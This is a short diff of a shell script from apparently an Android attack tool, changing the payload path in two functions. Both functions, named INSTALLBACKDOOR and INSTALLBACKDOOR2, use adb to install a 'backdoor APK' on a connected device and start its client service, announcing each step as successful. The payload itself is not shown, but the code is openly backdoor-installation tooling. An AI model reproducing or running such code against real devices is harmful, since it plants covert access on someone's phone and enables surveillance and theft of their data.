@@ -121,7 +121,7 @@ WHATSPWNREMOTE(){
 INSTALLBACKDOOR(){
 	. ./config
 	echo -e "${BOLD}INSTALLING BACKDOOR APK ... ${GREEN}[OK]${NONE}"
-	bin/adb install bin/${PAYLOAD}
+	bin/adb install ${PAYLOAD}
 	echo -e "${BOLD}INITIALIZING BACKDOOR APK ... ${GREEN}[OK]${NONE}"
 	bin/adb shell am startservice ${USER} my.app.client/.Client
 	MAIN
@@ -131,7 +131,7 @@ INSTALLBACKDOOR(){
 INSTALLBACKDOOR2(){
 	. ./config
 	echo -e "${BOLD}INSTALLING BACKDOOR APK ... ${GREEN}[OK]${NONE}"
-	bin/adb install bin/${PAYLOAD}
+	bin/adb install ${PAYLOAD}
 	echo -e "${BOLD}INITIALIZING BACKDOOR APK ... ${GREEN}[OK]${NONE}"
 	bin/adb shell am startservice ${USER} my.app.client/.Client
 }
